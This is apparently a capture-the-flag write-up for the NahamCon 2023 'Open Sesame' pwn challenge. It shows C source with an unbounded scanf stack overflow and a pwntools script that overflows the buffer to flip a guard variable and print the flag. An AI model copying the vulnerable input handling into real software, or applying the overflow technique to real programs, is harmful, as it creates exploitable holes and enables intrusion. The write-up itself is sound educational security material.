---
title: Open Seasame  , NahamCon 2023
author: megachar0x01
date: 2023-06-19
categories: [Pwn, amd64, ctf]
---

## Description : 
The updated program prompts the user to enter a password to open a simulated cave of gold. In addition to entering the correct password, the boolean variable `caveCanOpen` must also be set to `yes` for the cave to open. If both conditions are met, the program displays a success message, executes a system command to reveal the contents of the 'flag.txt' file (the treasure), and terminates. If the password is incorrect or the `caveCanOpen` variable is not set to `yes`, the program displays an error message or exits. The given program does not enforce any length limit on the user input, making it vulnerable to buffer overflow attacks. An attacker could potentially craft a payload by appending the correct password followed by a null byte to terminate the string, and then provide a large amount of junk values to override the `caveCanOpen` variable on the stack. By doing so, the attacker can bypass the check for `caveCanOpen == no` and proceed to the password validation step. This can lead to unauthorized access to the cave's treasure `flag.txt`

## Protection:

<img src="https://i.imgur.com/BhZ36RY.png" alt="vuln_1">


## Vulnerable Code:


```c
#include <stdlib.h>
#include <string.h>
#include <stdio.h>


typedef enum {no, yes} Bool;

void flushBuffers() {
    fflush(NULL);
}

void flag()
{  
    system("/bin/cat flag.txt");
    flushBuffers();
}

Bool isPasswordCorrect(char *input)
{
    return (strncmp(input, "OpenSesame!!!", strlen("OpenSesame!!!")) == 0) ? yes : no;
}

void caveOfGold()
{
    Bool caveCanOpen = no;
    char inputPass[256];
    
    puts("BEHOLD THE CAVE OF GOLD\n");

    puts("What is the magic enchantment that opens the mouth of the cave?");
    flushBuffers();
    
    scanf("%s", inputPass);

    if (caveCanOpen == no)
    {
        puts("Sorry, the cave will not open right now!");
        flushBuffers();
        return;
    }

    if (isPasswordCorrect(inputPass) == yes)
    {
        puts("YOU HAVE PROVEN YOURSELF WORTHY HERE IS THE GOLD:");
        flag();
    }
    else
    {
        puts("ERROR, INCORRECT PASSWORD!");
        flushBuffers();
    }
}

int main()
{
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);

    caveOfGold();

    return 0;
}
```



```python
#!/usr/bin/python3
from pwn import *
import struct

# Set the log level to control the verbosity of logs
context.log_level = 'error'

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
break *isPasswordCorrect
continue
'''.format(**locals())

# Set the path to the binary
exe = './open_sesame'
elf = context.binary = ELF(exe, checksec=False)
exe_rop = ROP(elf, checksec=False)

# Get the libc library
libc = elf.libc
libc_rop = ROP(libc, checksec=False)

# Start the process
io = start()

# Set the padding size
padd = 280

# Create the payload
payload = b"A" * padd
payload += b"B" * 6
payload = b"OpenSesame!!!\x00aaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa"

# Send the payload to the target binary
io.sendlineafter(b"What is the magic enchantment that opens the mouth of the cave?\n", payload)

# Switch to interactive mode to interact with the exploited binary
io.interactive()


```
